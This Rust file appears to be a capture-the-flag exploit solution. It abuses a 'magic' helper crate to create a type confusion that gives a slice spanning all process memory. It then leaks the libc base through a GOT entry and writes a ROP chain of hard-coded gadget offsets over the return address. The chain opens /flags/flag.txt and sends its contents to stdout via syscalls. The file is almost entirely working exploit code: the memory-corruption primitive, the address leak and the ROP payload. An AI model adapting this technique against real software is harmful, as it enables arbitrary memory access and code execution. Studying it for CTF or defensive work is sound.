use std::ffi::CStr;

use magic::{address_of_return_address, magic};

// offsets and gadgets
const PAYLOAD_FROM_BASE: usize = 0x3f1e0;
const SYMBOL_GOT_FROM_BASE: usize = 0x889a0;
const SYMBOL_FROM_LIBC: usize = 0x459a0;
const MOV_R9_RSP_16_CALL_R13: usize = 0xd39d9;
const ADD_RSP_0X28_RET: usize = 0x45f25;
const POP_R13_RET: usize = 0x41c4a;
const POP_RDI_RET: usize = 0x2a3e5;
const POP_RSI_RET: usize = 0x2be51;
const MOV_EAX_2_RET: usize = 0x56713;
const SYSCALL_RET: usize = 0x91316;
const POP_RDX_RCX_RBX_RET: usize = 0x108b03;
const MOV_R10_RCX_MOV_EAX_0X28_SYSCALL: usize = 0x119174;

pub fn payload() {
    let mut a = [0u8];

    pub enum E<'a> {
        A(usize, usize),
        B(&'a mut [u8]),
    }

    let mut e = E::B(&mut a);
    let (e1, e2) = magic(&mut e);

    let E::B(r) = e1 else { unreachable!() };
    let ptr = 0;
    let len = usize::MAX;
    *e2 = E::A(ptr, len);

    let the_memory = r;

    // "leak" libc
    let base = (payload as usize) - PAYLOAD_FROM_BASE;
    let malloc_got = base + SYMBOL_GOT_FROM_BASE;
    let libc_symbol = usize::from_le_bytes(the_memory[malloc_got..malloc_got + 8].try_into().unwrap());
    let libc = libc_symbol - SYMBOL_FROM_LIBC;

    static FILENAME: &'static CStr = c"/flags/flag.txt";
    static MODE: &'static CStr = c"r";

    let mut i = address_of_return_address!() as usize;
    // set r9 to the magic constant with the weird gadget 
    for offset in [
        libc + POP_R13_RET,
        libc + ADD_RSP_0X28_RET, // target for call
        libc + MOV_R9_RSP_16_CALL_R13,
        0,
        0,
        0x1337133713371337,
        0,
        // asm!(
        //     "syscall",
        //     in("rax") libc::SYS_open,
        //     in("rdi") FILENAME.as_ptr(),
        //     in("rsi") 0,
        //     in("rdx") MODE.as_ptr(),
        //     in("r9") 0x1337133713371337u64
        // );
        libc + POP_RDI_RET,
        FILENAME.as_ptr() as usize,
        libc + POP_RSI_RET,
        0,
        libc + POP_RDX_RCX_RBX_RET,
        MODE.as_ptr() as usize,
        0,
        0,
        libc + MOV_EAX_2_RET,
        libc + SYSCALL_RET,
        // asm!(
        //     "syscall",
        //     in("rax") libc::SYS_sendfile,
        //     in("rdi") 1,
        //     in("rsi") 3,
        //     in("rdx") 0,
        //     in("r10") 100,
        //     in("r9") 0x1337133713371337u64
        // )
        libc + POP_RDI_RET,
        1,
        libc + POP_RSI_RET,
        3,
        libc + POP_RDX_RCX_RBX_RET,
        0,
        100,
        0,
        libc + MOV_R10_RCX_MOV_EAX_0X28_SYSCALL,
    ] {
        the_memory[i..i + 8].copy_from_slice(&offset.to_le_bytes());
        i += 8;
    }
}

